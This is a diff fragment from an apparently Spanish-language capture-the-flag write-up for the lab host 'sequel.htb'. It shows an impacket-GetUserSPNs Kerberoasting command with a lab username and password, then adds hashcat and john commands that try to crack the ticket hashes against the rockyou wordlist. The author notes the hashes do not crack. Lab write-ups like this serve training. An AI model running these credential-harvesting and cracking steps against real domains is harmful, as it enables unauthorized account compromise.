@@ -109,4 +109,15 @@ impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su' -request
 ```
 
 Nos lo guardamos en un fichero llamado `hash`
-Los c
+Los crakeamos
+```shell
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```shell
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+```
+
+No son crakeables ya que no obtenemos ninguna password obtenida
+
+
